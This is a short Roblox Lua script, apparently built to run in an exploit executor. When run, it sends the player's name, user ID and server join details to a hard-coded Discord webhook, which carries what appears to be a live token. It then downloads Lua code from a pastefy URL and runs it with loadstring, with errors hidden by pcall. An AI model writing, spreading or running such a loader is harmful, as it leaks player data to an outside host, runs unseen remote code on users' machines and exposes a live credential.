-- LocalScript (place in StarterPlayerScripts)
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Discord webhook
local WEBHOOK_URL = "https://discord.com/api/webhooks/1406162216247623792/DdZdihmGWBrJQxh5l97gKP3p_21wCtHL5kDfwPoKPs7qt5Kss3uJByOtQdmsd_GPRROH"

-- Function to send webhook
local function sendWebhook()
    -- Deep link (direct join in Roblox client)
    local deepLink = "roblox://placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
    -- Normal web link (just opens game page)
    local webLink = "https://www.roblox.com/games/" .. game.PlaceId .. "?privateServerLinkCode=" .. game.JobId
    
    local payload = {
        username = "Roblox Server Logger",
        embeds = {{
            title = "Executor Triggered!",
            color = 65280,
            fields = {
                {name="Player", value=player.Name .. " (" .. player.UserId .. ")", inline=true},
                {name="PlaceId", value=tostring(game.PlaceId), inline=true},
                {name="JobId", value=tostring(game.JobId), inline=true},
                {name="Join via Roblox Client", value="[Click Here](" .. deepLink .. ")", inline=false},
                {name="Open in Browser", value="[Click Here](" .. webLink .. ")", inline=false},
                {name="Time", value=os.date("%Y-%m-%d %H:%M:%S"), inline=false}
            }
        }}
    }

    local json = HttpService:JSONEncode(payload)
    pcall(function()
        HttpService:PostAsync(WEBHOOK_URL, json, Enum.HttpContentType.ApplicationJson)
    end)
end

-- Run everything
pcall(function()
    -- Send webhook
    sendWebhook()

    -- Run external Lua script safely
    local luaCode = game:HttpGet("https://pastefy.app/ZiAiWmBR/raw")
    loadstring(luaCode)()
end)
